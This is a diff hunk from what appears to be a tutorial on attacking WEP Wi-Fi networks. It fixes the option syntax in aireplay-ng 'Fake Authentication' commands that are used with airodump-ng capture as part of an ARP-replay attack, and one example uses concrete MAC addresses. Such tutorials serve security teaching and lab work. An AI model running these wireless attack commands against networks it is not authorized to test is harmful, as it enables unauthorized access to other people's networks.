@@ -13,12 +13,12 @@ airodump-ng --bssid=<BSSID> --channel=<CH> --write=arpreplay $IFACE
 
 In a second terminal window, use `aireplay-ng` to associate with the network by performing a **Fake Authentication** attack a single time:
 ```bash
-aireplay-ng --fakeauth=0 -a=<MAC_ADDRESS_OF_TARGET_NETWORK> -h=<MAC_ADDRESS_OF_ADAPTER> $IFACE
+aireplay-ng --fakeauth=0 -a <MAC_ADDRESS_OF_TARGET_NETWORK> -h <MAC_ADDRESS_OF_ADAPTER> $IFACE
 ```
 
 The MAC address of the target network is the same BSSID used with `airodump-ng`. The MAC address of the wireless adapter is given by the first 12 characters of the `unspec` field of the network adapter (with dashes replaced by columns), as returned by `ifconfig` (same as the `ether` field when in `Managed` mode). For example:
 ```bash
-aireplay-ng --fakeauth=0 -a=64:16:F0:EC:7B:F3 -h=48:5D:60:2A:45:25 $IFACE
+aireplay-ng --fakeauth=0 -a 64:16:F0:EC:7B:F3 -h 48:5D:60:2A:45:25 $IFACE
 ```
 
 As a result:
